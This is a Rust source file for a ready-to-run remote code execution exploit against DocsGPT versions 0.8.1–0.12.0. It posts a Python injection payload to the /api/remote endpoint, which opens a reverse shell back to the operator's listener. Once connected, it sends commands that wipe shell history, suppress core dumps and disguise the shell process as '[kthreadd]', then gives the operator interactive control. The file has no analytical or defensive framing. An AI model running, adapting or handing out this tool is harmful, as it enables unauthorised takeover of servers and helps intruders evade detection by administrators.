use clap::Parser;
use colored::*;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(name = "DocsGPT RCE")]
#[command(about = "DocsGPT 0.8.1-0.12.0", long_about = None)]
struct Args {
    #[arg(short, long, default_value = "https://target.com:7091")]
    target: String,
    #[arg(short, long, default_value = "127.0.0.1")]
    lhost: String,
    #[arg(short, long, default_value = "7091")]
    lport: u16,
}

fn print_banner() {
    println!();
    println!("{}", "===========================================================================".red());
    println!(
        "{}",
        r#"
    ▓█████▄  ▒█████   ▄████▄    ██████     ██▀███   ▄████▄  ▓█████
    ▒██▀ ██▌▒██▒  ██▒▒██▀ ▀█  ▒██    ▒    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
    ░██   █▌▒██░  ██▒▒▓█    ▄ ░ ▓██▄      ▓██ ░▄█ ▒▒▓█    ▄ ▒███
    ░▓█▄   ▌▒██   ██░▒▓▓▄ ▄██▒  ▒   ██▒   ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
    ░▒████▓ ░ ████▓▒░▒ ▓███▀ ░▒██████▒▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
    ░ ▒  ▒   ░ ▒ ▒░   ░  ▒   ░ ░▒  ░ ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
    ░ ░  ░ ░ ░ ░ ▒  ░        ░  ░  ░       ░░   ░ ░           ░
    ░        ░ ░  ░ ░            ░        ░     ░ ░         ░  ░
    ░               ░                             ░
    "#
        .bright_red()
    );
    println!("{}", "===========================================================================".red());
    println!("{}", "good luck".dimmed().red());
}

fn send_exploit(target: &str, lhost: &str, lport: u16) -> Result<String, Box<dyn std::error::Error>> {
    let payload = format!(
        r#"user=1&source=reddit&name=other&data={{"source":"reddit","client_id":"9123","client_secret":1738,"user_agent":"482","search_queries":[""],"number_posts":12,"backend\\":__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\' %26')}}#":11}}"#,
        lhost, lport
    );
    let client = reqwest::blocking::Client::new();
    let url = format!("{}/api/remote", target);
    let response = client
        .post(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(payload)
        .send()?;
    let status = response.status();
    let body = response.text()?;

    println!("\n{} 0.0.0.0:{}", "[+] LISTENING:".bright_blue(), lport);
    println!("{} {}", "[+] TARGET:".bright_blue(), target);
    println!("\n{} {}", "[+] Status:".white(), status);
    println!("{}", "[+] Response:\n".white());
    println!("{}", body.truecolor(150, 150, 150));

    Ok(body)
}

fn handle_interactive_shell(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", "\ngo forth and be merry\n".red());

    // preset commands  
    let commands = vec![
        "unset HISTFILE && export HISTFILE=/dev/null && export HISTFILESIZE=0\n",
        "ulimit -c 0; set +m; nice -n 19 ionice -c3 -p $$ & trap '' HUP\n",
        "bash -c \"exec -a \"[kthreadd]\" bash -i\"\n",
    ];

    for cmd in commands {
        stream.write_all(cmd.as_bytes())?;
        thread::sleep(Duration::from_millis(800));
    }

    println!("{}\n", "[+] shh ...".truecolor(90, 90, 90));

    let running = Arc::new(AtomicBool::new(true));

    // clone stream for ctrlc handler
    let mut kill_stream = stream.try_clone()?;

    // ctrlc handler
    ctrlc::set_handler(move || {
        println!();
        kill_stream.write_all(b"kill $$\n").ok();
        thread::sleep(Duration::from_millis(500));
        println!("{}", "\n[*] sniped".red().dimmed());
        std::process::exit(0);
    })?;

    // clone stream for reader
    let mut read_stream = stream.try_clone()?;
    let mut write_stream = stream;

    // spawn reader thread
    let running_clone = running.clone();
    let reader = thread::spawn(move || {
        let mut buffer = [0u8; 4096];
        while running_clone.load(Ordering::SeqCst) {
            match read_stream.read(&mut buffer) {
                Ok(0) => break,
                Ok(n) => {
                    std::io::stdout().write_all(&buffer[..n]).ok();
                    std::io::stdout().flush().ok();
                }
                Err(_) => break,
            }
        }
    });

    // writer thread (main)
    let stdin = std::io::stdin();
    let mut buf_reader = BufReader::new(stdin);
    let mut input = String::new();
    loop {
        input.clear();
        match buf_reader.read_line(&mut input) {
            Ok(0) => break,
            Ok(_) => {
                if write_stream.write_all(input.as_bytes()).is_err() {
                    break;
                }
            }
            Err(_) => break,
        }
    }

    reader.join().ok();
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    print_banner();

    // setup listener
    let listener = TcpListener::bind(format!("0.0.0.0:{}", args.lport))?;

    // send exploit
    match send_exploit(&args.target, &args.lhost, args.lport) {
        Ok(_) => {}
        Err(e) => {
            eprintln!("{} {}", "[-] Error sending request:".red(), e);
            std::process::exit(1);
        }
    }

    // accept connection
    println!("\n{}", "[*] Waiting for connection...".yellow());
    match listener.accept() {
        Ok((stream, addr)) => {
            println!("{} {}", "[+] ESTABLISHED:".bright_green(), addr);
            handle_interactive_shell(stream)?;
        }
        Err(e) => {
            eprintln!("{} {}", "[-] Failed to accept connection:".red(), e);
            std::process::exit(1);
        }
    }

    Ok(())
}